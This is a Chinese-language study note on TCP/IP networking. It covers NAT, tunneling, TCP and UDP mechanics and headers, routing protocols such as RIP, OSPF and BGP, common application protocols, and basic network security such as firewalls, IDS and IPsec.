![QQ图片20220409150037](QQ图片20220409150037.png)

NAT有一些潜在的问题：

1、无法从NAT的外部向内部服务器建立连接

2、转换表的生成与转换都产生一定的开销

3、若NAT异常，则所有的TCP连接都要重置，即使有两台NAT做了容灾备份，TCP连接还是会断开。

为了解决第一个问题，应用可以和NAT路由器进行通信，控制NAT表的生成，这样NAT的外侧和内侧就可以通信了，这就是NAT穿越。

## IP隧道

对于下图这种网络结构，网络A和B之间将无法直接通信，为了解决这个问题，需要采用IP隧道的功能：

![QQ图片20220409174542](QQ图片20220409174542.png)

IP隧道中可以将那些从IPv6发来的包统合为一个数据，再为之追加一个IPv4的首部之后再转发给网络C。一般来说，紧跟着IP首部的是TCP或者UDP的首部，但是这种IP首部后跟着的还是IP首部的情况越来越多，这种网络层的首部后再追加网络层首部的方式就是IP隧道。

![QQ图片20220409184214](QQ图片20220409184214.png)

构造一个既支持IPv4又支持IPv6的网络是一项极其庞大的工程，所以采用IP隧道的方式来实现，仅需要在骨干网的设备进行设置即可，减少了工作量。

IP隧道可以转发多播消息。由于很多路由器没有多播包的路由控制信息，多播消息无法穿越路由器发送消息，在这类环境中，IP隧道可以仅用单播的形式发包，向距离较远的链路转发多播消息：

![QQ图片20220409184021](QQ图片20220409184021.png)

## IGMP

在多播通信中，确认接收端是否存在非常重要，如果没有接收端，发送多播消息会造成网络流量的浪费。确认是否有接收端，要通过MLD（Multicast Listener Discovery，多播监听发现）来实现，它是IPv4中IGMP和IPv6中ICMPv6中的重要功能之一。

IGMP/MLD主要有两个作用：

1、向路由器表明想要接收多播消息，并通知其想接收多播的地址

路由器收到消息后，会将该信息通知其他路由器，准备接收多播消息

2、向交换集线器通知想要接收多播的地址

通常交换集线器对多播帧像对待广播帧一样，会将消息发送到所有端口，导致网络负荷加重，而支持IGMP探听的交换集线器可以过滤多播帧，获取多播发送的地址和端口，不会向无关的端口发送多播帧，减轻负荷。

![QQ图片20220409185858](QQ图片20220409185858.png)

## IP任播

IP任播指的是为那些提供同一种服务的服务器配置同一个IP地址，并与最近的服务器进行通信的一种方法。应用场景包括DNS根域名服务器。

IP任播的缺点就是很难将第一个包和第二个包发送给同一个目标主机，面对需要连续多个包连续通信的场景就会出现问题。

## 通信质量控制

IP协议是一个尽力服务的协议，并没有通信服务质量的保证，如果遇到通信线路拥堵的情况（也称网络的收敛），会导致路由器和集线器的队列溢出，出现大量的丢包现象。因此出现了在IP通信过程中保证服务质量（QoS：Quailty of Service）的技术。

控制通信质量的工作机制就是对通信设置优先级，对力所能及的范围内对其进行优先处理。提出了RSVP技术，包括详细优先控制IntServ，和较粗力度的优先控制DiffServ。

IntServ的机制较为复杂，总体来说，是接收端针对发送端传送控制包，在它们之间的所有路由器上进行质量控制设定。

DiffServ会对IP包首部中的DSCP字段（TOS字段的替代）进行替换，对于期望被优先处理的包设置一个优先值，路由器根据这个字段优先处理这些包，在发生网络拥塞的时候还可以丢弃优先级较低的包。

## 显式拥塞通知

在发生网络拥塞时，发送主机应该减少数据包的发送。虽然TCP也能控制网络拥塞，但是它是通过数据包的实际损坏情况来判断的，发现时机比较滞后。

所以人们在IP层新增了一种显式拥塞通知的机制，即ECN。ECN将IP首部的TOS字段置换为ECN字段，通知拥塞的时候，会将当前的拥塞情况记录在首部，传达给发送数据包的源地址主机。

![QQ图片20220409192516](QQ图片20220409192516.png)

## Mobile IP

当移动设备连接到不同的子网时，都会通过DHCP分配到不同的IP地址，这样的IP地址变更可能带来问题，一些需要持续通信的场景会出错。

Mobile IP技术可以让主机所连接的子网IP发生变化时，主机IP地址保持不变，应用不需要做任何改动。及时是IP地址发生变化的场景，通信也能继续。

它的原理主要是：移动之后通过外部代理转发数据包，向归属代理通知自己的地址。从应用层看移动主机，它的地址在变，但是实际网络中确是一直以转交地址进行通信的。其中还使用了隧道，外部代理使用隧道将IP包转化为原始数据包。

# TCP和UDP

## 传输层

IP首部中的协议字段，用来标识网络层的上一层所采用的到底是哪一种传输协议，根据这个字段，就可以识别IP传输的数据部分到底是TCP还是UDP。同样的道理，TCP和UDP为了识别自己的数据部分属于哪个应用，也设置了这样一个编号，这个编号要指出数据部分将要交给哪个具体的程序，这个编号就是端口（和路由器、交换机的端口是两个概念）。

在传输层最具代表性的协议就是TCP和UDP。

TCP是面向连接的、可靠的流协议，它实行顺序控制和重发控制的机制，还具有流量控制、拥塞控制等功能，用于需要可靠传输的场景；UDP是不可靠的数据报协议，它无法确保消息一定会到达，应用有时会根据自己的需要进行重发处理，用于对高速传输和实时性有较高要求、广播多播、包总量较少的DNS/SNMP等场景。

跟TCP和UDP紧密相关的，是套接字socket，它是操作系统提供的一套API，应用程序通过这些API，可以设置目标IP地址、端口，并实现数据的发送和接受的逻辑。

## 端口号

端口号被从来识别同一台计算机中进行通信的不同应用程序。

通信中通常采用5个信息来识别一个通信，当全部相同时就被认为是同一个通信，它们是：源IP地址、目标IP地址，源端口号、目标端口号、协议号。

确定端口号的方法有两种：

1、标准既定的端口号。有一些广为使用的应用协议所使用的的端口号是固定的，如HTTP、FTP，也被称为知名端口号，它们一般在0-1023之间。还有一些端口号被正式注册了，它们在1024-49151之间。

2、时序分配法。对于服务端来说，需要确定一个固定的监听端口号，但是对于客户端，可以让操作系统动态分配一个端口号来使用，只要不冲突就行，动态分配的端口号在49152-65535之间。

端口号由使用的传输层协议决定，不同的传输协议可以使用相同的端口号，即使是相同端口号，只要协议不同，处理逻辑就不同。

## UDP

UDP：User Datagram Protocol。它无法在网络拥堵的情况下做流量控制，传输途中即使出现丢包，UDP也不负责重发，也没有顺序机制。当需要完成这些功能的时候，需要交给使用UDP的应用程序去完成。它只提供作为传输层协议最基本的功能。

## TCP

TCP的功能强大，它作为面向有连接的协议，只有确认通信对端存在时，才会发送数据。它的强大功能，都是为了实现可靠传输。

### 序列号与确认机制

在TCP中，当发送端的数据到达接受主机，接受端主机会返回一个已收到消息的通知，这个消息叫确认应答ACK（Positive Acknowledgement），有点类似于两人对话时，对方告知已听清的意思。

有这种机制，数据就可以有序的传输给对方：

![QQ图片20220409200544](QQ图片20220409200544.png)

TCP通过肯定的确认应答ACK来实现可靠的数据传输，如果一定时间内没有等到确认应答，发送端就会认为数据已丢失，故而进行重新发送。

当网络比较拥堵的时候，发送端已经重复发送了，接收端才收到第一次发送的信息，此时接收端就会重复接受到相同的数据，为了不至于重复接受，TCP使用了序列号的机制。序列号告知了对方发送的数据是哪一部分的，而应答号会告知对应的数据已经接受到，这样就可以处理数据的重复了：

![QQ图片20220409200840](QQ图片20220409200840.png)

### 重发超时时间

重发超时时间值的是在重发数据之前，等待确认到达ACK的那个时间间隔。如果这个时间内未收到ACK，则进行重发。

重发超时时间根据网络环境的不同，随时进行调整。每次发包的时候都会计算往返时间及其偏差，在这基础上取一个稍大于此的值就是重发超时时间。之所以计入偏差（也成为方差，或者抖动），是因为有时往返时间会产生大幅度的摇摆，可能是由于数据包的分段是经过不同线路到达的。

![QQ图片20220409201800](QQ图片20220409201800.png)

超时以0.5s为单位进行控制，重发超时都是这个数字的整数倍，最初的数据包的超时等待时间一般为6s左右。当数据被重发之后还收不到应答，重发超时时间会以2倍、4倍的指数函数延长。

当数据重发次数到达一个值后，就会判断网络或对端主机发生了异常，会强制关闭连接，通知上层应用终止服务。

### 连接的建立和断开

TCP的数据连接通过三次握手来实现，断开连接通过四次挥手来完成。其中涉及到SYN建立连接的通信。FIN请求切断连接：

![QQ图片20220409202217](QQ图片20220409202217.png)

### 以段为单位发送数据

在三次握手的过程中，会确定MSS（Maximum Segment Size）最大消息长度，最理想的情况是，MSS正好是IP中不会被分片处理的最大数据长度。

TCP在传送大量数据时，是以MSS的大小将数据进行分割发送。三次握手中，会在首部中设置自己的接口能适应的MSS的大小，建立连接后，双方就按照这个MSS来发送数据：

![QQ图片20220409202750](QQ图片20220409202750.png)

### 滑动窗口控制

TCP若采用每发一个段就进行一次确认应答的处理，包的往返时间越长通信性能越低。

为了解决这个问题，TCP引入了窗口的概念，发送端主机在发送了一个段以后不必要一致等待确认，而是继续发送，确认应答也不再分段，而是以更大的单位进行确认。![QQ图片20220409203249](QQ图片20220409203249.png)

这个窗口使用了计算机中的缓冲区，当收到确认应答时，窗口向前移动，窗口内的数据没有收到确认应答则进行重发：

![QQ图片20220409203550](QQ图片20220409203550.png)

### 重发控制

如果在TCP通信的过程中，出现了段丢失该如何处理。

首先考虑ACK未能返回的情况，若某个段的ACK未返回，下一个ACK成功返回，说明数据已经成功到达对端，此时数据不会重新发送：![QQ图片20220409204148](QQ图片20220409204148.png)

若发送出去的数据未到达对端，此时接受端的主机会针对丢失的段数据，重复发送之前丢失部分的数据，如下图所示，若1-1000的段数据丢失，接收端即使收到了其他段的数据，也之后发送1001的确认应答，当发送端收到3个同样的应答时，则对该段数据进行重发，这就是高速重发机制：

![QQ图片20220409204351](QQ图片20220409204351.png)

### 流控制决定窗口大小

有时，接受端处理信息的速度慢，而发送端以相同的速度发送数据时，就会让消息超出负荷，信息丢失后发送端又会重发，导致网络流量的无端浪费。

为了解决这个问题，TCP使用流控制，接收端主机告知发送端自己可以接受的数据大小，这个数据限度就是窗口大小，这个信息在TCP首部中（窗口探测字段），该字段的值说明了网络的吞吐量。在接收端的缓冲区即将面临数据溢出时，就会将这个值调小，控制数据的发送量：

![QQ图片20220409204815](QQ图片20220409204815.png)

TCP通信的最大吞吐量由窗口大小和往返时间RTT确定：

![QQ图片20220410101141](QQ图片20220410101141.png)

因此，使用多个连接能达到更高的网络吞吐量。

### 拥塞控制决定窗口大小

如果在通信刚开始的时候就发送大量数据，此时接收方还没来得及控制窗口大小，也会造成网络拥堵。TCP此时采用慢启动的策略，最初将拥塞窗口设置为1，每收到一个ACK，就将窗口的值+1。发送的过程中，将拥塞窗口的大小和接收端主机通知的窗口大小比较，取其中的较小值作为发送窗口的大小。

当拥塞窗口的值超出某个阈值，每收到一次确认应答，就会用以下比例放大拥塞窗口：

![QQ图片20220409205755](QQ图片20220409205755.png)

这个阈值就是慢启动阈值。当TCP通信刚开始时并没有设置慢启动阈值，而是当超时重发时，会取当时拥塞窗口的一半为慢启动阈值，窗口的大小就设置为慢启动阈值+3个数据段（MSS）

有了这样的机制，TCP的拥塞窗口就会发生下图的变化，刚开始网络吞吐量逐渐上升，随着网络拥堵的发生，会突然下降，然后缓慢上升：

![QQ图片20220409205904](QQ图片20220409205904.png)

### 提高网络利用率的规范

1、Nagle算法

当发送端还有应该发送的数据，但这部分数据较少的话，则进行延迟发送。它虽然能提高网络利用率，但是会发生某种程度的延迟，经常关闭该算法的使用。

2、延迟确认应答

收到数据后不立即返回应答，而是延迟一段时间。在没有收到2倍的最大段长度的数据时不做确认应答，最大延迟0.5秒确认应答（根据不同操作系统设置确定延迟策略）

因为TCP采用滑动窗口的控制机制，不用为每个请求都应答一次，在TCP文件传输中，经常是每两个数据段应答一次。

3、捎带应答

捎带应答是指同一个TCP包中既发送数据，又发送确认应答的一种机制，它会提高网络利用率。但是前提是必须启动延迟确认应答机制。

## 其他传输层协议

1、UDP-Lite：它在UDP的基础上，可以自定义计算校验和的范围，可以针对不允许发生错误的部分进行检查，对于其他部分即使发生了错误也会被忽略不计。

2、SCTP：和TCP类似，其特点有：

* 用于收发众多较小消息的情况，这些较小的消息被称为数据块，多个数据块组成一个数据包
* 支持多重宿主：在有多个NIC的主机中，即使NIC发生变化，也仍然可以继续通信。这是因为SCTP可以同时管理多个IP地址进行通信。
* 支持多数据流通信
* 自定义的消息生存机制

3、DCCP：一个辅助UDP的传输层协议，它提供了拥塞控制机制。

它面向连接，具备建立连接和断开连接的处理，接收端收到包之后返回确认应答ACK，该确认应答被用于重发与否的判断。

## UDP首部

UDP首部格式如下：

![QQ图片20220410093820](QQ图片20220410093820.png)

源端口号：占16位，该字段是可选项，有可能不会设置源端口号。在不需要返回的通信中置为0.

目标端口号：占16位

包长度：该字段保存了UDP首部的长度和数据的长度之和，单位为字节

校验和：对UDP伪首部进行计算得到的校验值。

UDP伪首部：（对IPv6 IP地址占128位）

![QQ图片20220410094638](QQ图片20220410094638.png)

接受端收到UDP数据报之后，从IP首部获取到IP地址信息，然后将地址信息尾部填充0，至整体伪首部长度为16的倍数，再进行校验和计算。之所以这样计算是因为伪首部包含的信息正好是通信的五大要素，这部分的信息极为重要。

当不使用校验和的时候，校验和字段填入0。此时协议处理的开销就会降低，但是一般不禁用。

## TCP首部

TCP首部的格式：

![QQ图片20220410095108](QQ图片20220410095108.png)

源端口号和目标端口号：占16位

序列号：占32位，代表发送数据的位置。每发送一次数据，就会增加该值。序列号不会从0或1开始，而是建立连接的时候生成一个随机数。

确认应答号：占32位，指已收到确认应答号减1为止的数据。

数据偏移：它标记了TCP传输数据部分在TCP包中的具体位置，也可以把它看成TCP首部的长度，占4位，单位为4字节。

保留：扩展使用

控制位：共8位，从左至右分别是以下：

* CWR：用于IP首部的ECN字段，与拥塞控制相关，它被置为1代表发送端已经降低了包的发送速度。
* ECE：用于IP首部的ECN字段，与拥塞控制相关，它被置为1代表通知对方存在网络拥塞。
* URG：该位为1时，代表包中有需要紧急处理的数据。
* ACK：该位为1时，代表确认应答
* PSH：该位为1时，代表需要将数据立刻传给上层应用协议，为0时，则可以先进行缓存
* RST：该位为1时，标识TCP连接中出现异常必须强制断开连接。例如没有被使用的端口收到连接请求，就会返回一个RST为1的包。
* SYN：该位为1时，代表希望建立连接。
* FIN：该位为1时，代表希望断开连接，之后不会再由数据发送。

窗口大小：该字段占16位，用于通知对方所能接受的数据大小。

校验和：对TCP伪首部进行校验计算的结果

伪首部格式：

![QQ图片20220410100450](QQ图片20220410100450.png)

TCP的校验和UDP类似，区别在于TCP的校验和无法关闭。

（TCP和UDP的校验和数据链路的FCS校验的目的不同，前者是为了防止程序漏洞或内存故障导致的数据被破坏，后者是为了防止噪声干扰通信）

紧急指针：占16位，只有URG位1时有效，表示本报文段中紧急数据的指针，从数据部分的首位到紧急指针所指示的位置都是紧急数据。

选项：用于提高TCP的传输性能的字段集合。常用的功能有决定最大段MSS长度、窗口扩大选项、时间戳、选择确认应答机制（允许最大4次的数据段丢失）

# 路由协议

## 路由控制

让数据包正确的到达目的地，路由器必须在途中进行正确转发，这就是路由控制。路由器根据路由控制表来转发数据包。路由控制分为静态路由和动态路由。

静态路由是管理员手工对路由信息进行设置的方法。每新增加一个网络，就需要将这个网络信息设置在所有的路由器上，且某个路由器发生故障后，路由信息就是错误的了，需要管理员手动调整，这些都对管理工作带来很大的麻烦。

动态路由是指管理员设置好路由协议，路由器就可以自动的进行路由信息的记录、故障修复。当一个新的网络被追加的时候，只需要在新增加网络的路由器上进行动态路由的设置即可。

![QQ图片20220410113325](QQ图片20220410113325.png)

这两种手段经常结合起来使用。

## 路由控制范围

路由控制范围常使用IGP（Interior Gateway Protocol）和EGP（Exterior Gateway Protocol）两种协议。

前者是在自洽系统内部控制动态路由的域内路由协议（内部网关协议），后者是自洽系统之间的路由控制协议：域间路由协议（外部网关协议）。

自洽系统就是可以制定自己的路由策略的小型单位系统，如区域网络、ISP。

![QQ图片20220410132643](QQ图片20220410132643.png)

IGP中可以使用RIP、RIP2、OSPF等协议；EGP中使用的是BGP协议。

## 路由算法

路由控制算法一般有两种：距离向量算法和链路状态算法。

### 距离向量算法

距离向量算法DV是指根据距离和方向决定路由的算法。路由控制表记录的信息是到网络x的距离为y，路由器之间可以互换目标网络的方向及其距离的相关信息。当网络构造较复杂时，在获得稳定的路由信息之前需要消耗一定的时间（路由收敛），容易发生路由循环等问题。

![QQ图片20220410133939](QQ图片20220410133939.png)

### 链路状态算法

链路状态算法是路由器在了解网络整体状态的基础上生成路由控制表的一种算法。所有路由器持有相同的信息，只要路由器和其他路由器保持同步，就能让路由信息到达稳定的状态，容易判断路由器信息的正确与否（而距离向量算法由于每个路由器保存的信息不同，还需要进一步判断）

在规模巨大又复杂的网络结构中，管理和处理这些路由信息需要高速CPU和大量的内存。

![QQ图片20220410134239](QQ图片20220410134239.png)

### 几种路由协议的特点

![QQ图片20220410134350](QQ图片20220410134350.png)

## RIP

RIP将路由控制信息定期30秒向全网广播，如果等了180秒仍未收到路由信息，则连接被关闭。

![QQ图片20220410141029](QQ图片20220410141029.png)

路由器A到网络A的距离为1，这个信息传给路由器A相邻的路由器B时，路由器B就会认为自己到网络A的距离为2，以此类推。

距离向量算法的距离单位被称为跳数，跳数就是经过的路由器个数。当信息交换完成后，路由器到某个网络的距离可能有多种路径产生的答案，此时取这些距离中较短的那个生成路由信息表：

![QQ图片20220410141311](QQ图片20220410141311.png)

当一个路由器到某网络的连接断开，其他路由器也可以获知这个信息。这个设计有一些问题，比如路由器A和网络A相连，这个信息被传递给路由器B，于是路由器B也认为自己和网络A相连，当路由器A和网络A的连接断开时，由于路由器B将自己的路由信息广播，这让路由器A认为它和网络A的连接没有断开。这样的自己收到自己发出去的消息的问题叫无限计数。

为了解决无限计数的问题，规定最远的距离不超过16，这样即使发生问题，也可以从时间上控制。而且规定路由器不能将所收到的路由消息原路返回给发送端，这种限制被称为水平分割。

当面对有环路的网络时，依然需要很长时间才能将故障传递出去。为此规定当网络中发生断开连接的情况时，路由器就发送一个距离为16的消息，这个消息就会触发其他路由器更新，获知这个故障。

虽然有这些措施，但是当网络复杂时，网络路由收敛依然需要较长的时间，为此可以使用明确掌握网络结构的OSPF协议。

RIP2是RIP的第二版，它的特点如下：

* 使用多播，而不是广播交换路由信息
* 支持在交换路由信息中加入子网掩码信息
* 可以有自己的路由选择域，一个网络中可以使用多个独立的RIP
* 支持把从BGP获得的路由信息通过RIP传给子网内
* 支持身份验证，RIP包中携带密码，只有识别该密码时才接受数据

## OSPF

OSPF在交换路由信息的时候，会把x路由器和y网络相连的消息传递给所有的路由器，在每个路由器中掌握着完整的网络拓扑结构，即使有环路也可以高效路由。

RIP的路由选择是优先选择路由器个数较少的路径，而OSPF会优先选择代价较小的路径，这个代价就是给每条链路赋予一个权重，OSPF会计算某个路径的权重之和。

![QQ图片20220410142539](QQ图片20220410142539.png)

在一个相对简单的网络结构中，相邻路由器之间可以交换路由信息，但在一个复杂的网络中，就不需要所有相邻的路由器之间都进行信息交换，而是指定一个路由器并以它作为中心交换路由信息即可。

OSPF中根据作用的不同可以分为5种类型的包：

![QQ图片20220410221610](QQ图片20220410221610.png)

OSPF通过发送问候HELLO包来确认是否连接，每个路由器会先相互发送数据库描述信息，其中有路由摘要信息和版本信息。若信息版本比较老，则首先发出一个链路状态请求包请求路由信息，由链路状态更新包来接受路由信息，最后通过链路状态确认应答信息来通知大家已经收到路由信息。

OSPF中进行连接确认的协议叫HELLO协议，LAN中每10秒发送一个HELLO包，如果到第4次仍无反馈就认为连接已经断开，由于链路状态发生了变化，路由器就会发送链路状态更新包通知其他路由器。

链路状态更新包分为两类：网络LSA（Network Link State Advertisement）和路由器LSA（Router Link State Advertisement），网络LSA是以网络为中心生成的信息，表示这个网络与哪些路由器相连接，路由器LSA是以路由器为中心生成的信息，表示路由器与哪些网络相连。路由器根据这两类信息生成了链路状态数据库，根据此数据库，采用Dijkstra算法（最短路径优先算法）生成相应的路由控制表：

![QQ图片20220410222832](QQ图片20220410222832.png)

相比距离向量，这种方式生成的路由控制表更加清晰，有效降低无限循环问题的发生。但是当网络规模逐渐增大时，最短路径优先算法处理的时间就会变长，对CPU和内存的消耗也会变大。

为了解决这个问题，OSPF引入了区域的概念。区域是指将连接在一起的网络和主机划分成小组，使一个自洽系统（AS，Autonomous System）内可以有多个区域。拥有多个区域的自洽系统必须要有一个主干区域，并且所有其他区域必须都与这个主干区域相连接。

连接区域与主干区域的路由器叫区域边界路由器，区域内部的路由器叫内部路由器，只与主干区域内相连的路由器叫主干路由器，与外部相连接的路由器是AS边界路由器。

每个区域内的路由器都持有本区域网络拓扑的数据库，区域之外的路径信息只能从区域边界路由器处获取，区域边界路由器只会发送外部区域的连接信息给其他区域，这样内部路由器持有的网络拓扑数据库就会明显变小。

因此想要OSPF中构造一个稳定的网络，物理设计和区域设计也很重要，如果区域设计不合理，就难以发挥OSPF的优势。

## BGP

BGP：Border Gateway Protocol边界网关协议，是连接不同自洽系统的协议，它属于外部网关协议EGP。

为每个自洽系统分配一个编号，BGP就根据这个编号进行路由控制。每个自洽系统AS都有一个代表，代表可以决定AS内部的网络运营和相关决策，和其他AS相连时，也需要代表之间进行协商。

BGP是一个路径向量协议。BGP使用AS进行路由选择的度量，它会选择经历AS较少的路径，也会遵循ASZ之间一些更细粒度的路由选择（因此它不是一个距离向量型协议）。在路由时，会使用一个叫AS路径信息访问列表，他会记录着IP地址和AS的关系，针对一个AS出现多条路径时，会选择一个最短的路由。

BGP不是距离向量型协议，而是路径向量协议，它不仅会记载转发方向和距离，还会记录了所有AS的编号，因此可以检测出环路，避免无限计数的问题。

## MPLS

在转发IP数据包的过程中除了使用路由技术外，还在使用标记交换技术，其中代表的是多协议标记交换技术，即MPLS（Multi Protocol Label Switching）

MPLS不需要像MAC地址一样直接对应到硬件设备，不需要数据链路层协议的作用。基于标记的转发需要在实现MPLS功能的路由器上使用，它就是标记交换路由器（LSR，Label Switching Router），与外部网络部分连接的那部分LSR叫标记边缘路由器（LER，Label Edge Router），MPLS需要在LSR上对数据包进行追加标记和删除标记。

如果数据链路本来就有一个相当于标记的信息，那么可以直接映射，如果没有（如以太网），需要追加一个全新的垫片头（Shim Header），它在IP首部和数据链路首部之间。数据转发就是通过标记来进行对应的。

![QQ图片20220415221225](QQ图片20220415221225.png)

MPLS的优点：

1、转发速度快，转发IP数据包的时候，需要对目标地址和路由控制表中的地址进行比较，涉及到最长匹配原则，而MPLS处理的数据量大幅度减少，主干路由器也无需保存太多信息

2、利用标记生成虚拟路径，并在它上面实现IP等数据包的通信

# 应用层协议

TCP/IP中的应用层协议相当于OSI参考模型中第5/6/7层的所有功能，包含了会话层（管理通信连接）、表示层（转换数据格式）、应用层（与对端主机交互）的功能

## 远程登录

远程登录是为了实现TSS（Time Sharing System分时系统）诞生的技术，它就是从自己的本地计算机登录到一个远程主机。主要使用TELNET和SSH两种协议。

### TELNET

TELNET利用TCP的一条连接，通过这条连接向主机发送文字命令并在主机上执行。TELNET主要功能有仿真终端和协商选项两种：

仿真终端就是本地用户好像直接与远程主机内部的Shell相连，命令输入后传给主机的守护进程telnetd，然后发送给操作系统内部执行，将执行结果再返回给telnet客户端。

协商选项的意思就是可以选择界面控制的模式，比如行模式和透明模式，它也是通过TELNET客户端和服务端之间的选项功能设置的：

![QQ图片20220418224220](QQ图片20220418224220.png)

它主要用于登录路由器或者交换机进行相应的设置。

### SSH

SSH是加密的远程登录系统，TELNET无需输入密码就可以发送容易有安全问题，而SSH可以加密通信内容，即使被窃听也无法破解。还包括认证机制、转发文件（scp、sftp）、端口转发的功能。

端口转发是指SSH服务端程序可以将特定端口号的信息转发到指定的IP和端口号，经过SSH连接的信息被加密，确保了信息安全，整个过程建立了3个TCP连接：

![QQ图片20230622103606](QQ图片20230622103606.png)

## 文件传输FTP

FTP是在两个相连的计算机之间进行文件传输的协议。

FTP使用两条TCP连接完成功能，一条用来控制，一条用来数据文件传输。

控制部分的功能有登录验证、查询文件名和位置；传输部分负责传输文件、文件预览等，传输完毕后这条连接会断开：

![QQ图片20220418224255](QQ图片20220418224255.png)

FTP是使用ASCII码字符串的协议，输入的命令命令和响应信息都是有特殊含义的，可以查询相关表格来找到对应信息。

## 电子邮件

电子邮件就是网络上的邮政，发送距离和时间不受限。

提供电子邮件的协议叫SNMP（Simple Mail Transfer Protocol），它在传输层也用了TCP协议。为了保证计算机在开机或者关机的时候都顺利发送邮件，引进了一种会一种开启的邮件服务器，发送和接受端通过邮件服务器进行收发邮件，接收端从邮件服务器接收邮件时使用POP3协议：

![QQ图片20220418224341](QQ图片20220418224341.png)

电子邮件地址的格式：名称@通信地址。目前电子邮件的发送地址由DNS管理，其中注册有邮件地址及对应的域名。

MIME规定了应用消息的格式，使电子邮件可以发送除了文本格式以外的图形、声音、动画等，它由首部和正文两部分组成，规定了数据类型，在OSI参考模型中属于第6层表示层。

SMTP是发送电子邮件的协议，它建立一个TCP连接后，在连接上进行控制和应答以及数据的发送，发送一封电子邮件要经历以下几个阶段：开始通信、发送人确认，接受人确认、正文传输、首部传输和关闭连接。下图中的数字代表各种响应，250代表完成请求命令：

![QQ图片20220418225145](QQ图片20220418225145.png)

SMTP本身没有验证发送者的功能，目前可以通过POP before SMTP和SMTP认证来进行认证，防止冒充。

### POP

SMTP协议用于发送邮件，但是没有考虑到接受端关机的情形。POP协议为了解决这个问题，会将邮件先发送给一直处于可用状态的POP服务器，然后客户端再从POP服务器获取邮件。POP与SMTP一样，也是在客户端与服务器之间建立一个TCP连接完成相应操作，具体命令和应答也有对应的表格一一对应。

### IMAP

IMAP也是接受电子邮件的协议，不同之处在于IMAP中邮件由服务器进行管理。使用IMAP时，不必下载所有邮件也可以阅读，也可以只选择下载部分附件。

## WWW

万维网WWW，World Wide Web是将互联网中的信息以超文本形式展示出来的系统，也叫Web，可以显示WWW信息的客户端软件叫Web浏览器。WWW的重要组成部分是访问信息的位置URI、信息的表现形式HTML、信息处理的协议HTTP

### URI

URI（Uniform Resource Identifier）是广义的识别码，主页地址一般被叫做URL（Uniform Resource Locator），它用来标识互联网中资源的具体位置，一般是：

~~~
http://主机名:端口号/路径?访问内容#部分信息
~~~

## 网络管理SNMP

当网络规模变得越来越大，需要一个严密的工具和方法来进行网络管理，在TCP/IP网络管理中可以使用SNMP（Simple Network Management Protocol）收集必要的信息。

![SNMP](SNMP.png)

SNMP中管理端叫SNMP管理器，被管理端叫代理（路由器、交换机等），SNMP负责管理器和代理之间的信息转发和处理，SNMP管理器可以发出查询请求、设置请求，代理端也可以向管理器发出事件通知。

SNMP中交互的信息是MIB（Management Information Base），MIB是在树形结构的数据库中位每个项目附加编号的一种信息结构，它相当于SNMP的表示层，通过传输不同的MIB可以实现统计信息、修改设置等功能。MIB树举例：

![MIB树](MIB树.png)

MIB由监控网络中的某个设备接口的众多参数组成，RMON（Remote Monitoring MIB）由监控网络上线路的众多参数构成，将信息从一个点扩展成了一条线，可以更高效的监控网络。

## 其他应用层协议

### 多媒体通信实现技术

在互联网电话和电视会议中，即使有少许丢包，也希望系统延时少一点，非常注重系统的即时性，因此在实时多媒体通信中多采用UDP。

但仅仅使用UDP是不够的，还需要提供对方的号码、以什么形式交换数据等，呼叫控制主要采用H.323与SIP协议，用于增加报文排序机制的RTP协议，以及对丢包率等线路质量进行管理的RTCP协议、用于减少音频和视频数据大小的压缩技术MPEG协议。

### P2P

互联网上很多通信普遍属于一台服务器对应多个客户端的C/S模式，即1对N的通信形态；而不经过服务器直接进行1对1相互通信的情况就叫做P2P：Peer To Peer，P2P中主机具备客户端和服务端两方面的功能，以对等的关系相互提供服务：

![P2P](P2P.png)

### LDAP

LDAP是访问目录服务的一种协议，目录服务是网络上存在的一种提供相关资源的数据库的服务。

# 网络安全

## 网络安全构成要素

总览：

![网络安全](网络安全.png)

### 防火墙

防火墙是为了避免域内受到非法访问设置的技术手段。防火墙有很多种，比如专门过滤或者不过滤某些特定数据包的过滤防火墙，数据到达应用后由应用处理并拒绝非法访问的应用网关。

这些防火墙的基本设计思路就是：暴露给危险（外部网络）的主机和路由器的个数要有限。

若网络中有1000台主机，若为1000台主机中的每一台都设置非法访问的策略，将非常繁琐。若设置防火墙的话，会只将设置了安全措施的主机暴露出去。

例如下面的防火墙，路由器设置了只向其发送特定地址和端口号的包，这就是包过滤防火墙，当从外部发送过来TCP通信请求时，只允许对Web服务器的TCP 80端口和邮件服务器的TCP 25端口的访问，其余的包全部丢弃。（除了必要的DNS等包）

此外，建立TCP连接的请求只允许从内网发起，防火墙可以通过监控TCP包首部中的SYN和ACK标志位实现，若这两个是1和0的时候，就意味着外网向内网发起TCP连接，这种包会被直接丢弃。

![防火墙](防火墙.png)

### IDS

IDS是入侵检测系统，它对已经侵入内部网络进行非法访问的情况进行检查和监控，并及时通知给网络管理员。它与防火墙相辅相成，实现更安全的网络环境。

在子网中可以设置一个服务器并在这台服务器上建立一个允许从互联网直接进行通信的专用子网，这种将外网与内网隔开的专用子网就叫做DMZ（DeMilitarized Zone，非军事化区），它要设置充分的安全策略，万一这台对外公开的服务器受到侵袭，也不会波及内部网络。

### 反病毒和个人防火墙

反病毒是指对计算机的病毒进行清理；个人防火墙可以提供屏蔽垃圾邮件、阻止广告弹出等功能。

## 安全协议

### IPsec与VPN

虚拟专用网Virtual Private Network VPN，它采用加密和认证技术，以达到：即使读取数据也无法读懂、检查是否被篡改，这两种效果。

在构建VPN时，最常被使用的是IPsec，它是指在IP首部后面追加ESP（封装安全有效荷载）、AH（认证首部），以对数据进行加密。

在传输模式中，会对TCP首部和数据部分进行加密处理，在对端主机再解密；在隧道模式中，在VPN路由器中会对TCP首部、数据部分、IP首部进行加密处理，在对端的VPN路由器进行解密：

![加密IP](加密IP.png)

### IEEE802.1X

IEEE802.1X是为了能接入LAN交换机和无线LAN接入点而对用户进行认证的计数，只有被认可的设备才能访问网络。它是一个数据链路层控制的协议，与TCP/IP关系紧密。它由客户端终端、AP（接入点，一般是无线基站）或2层交换机、认证服务器组成。

协议的过程：

最开始有一个尚未经过认证的终端连接，起初会无条件的连接到VLAN，获取临时的IP地址，此时只能连接到认证服务器。连接到认证服务器后，用户被要求输入用户名和密码，认证服务器受到该信息后，将该用户所能访问的网络信息通知给无线LAN接入点和终端，随后AP进行VLAN号码切换、终端的IP地址重置，最后连接到网络：

![协议过程](协议过程.png)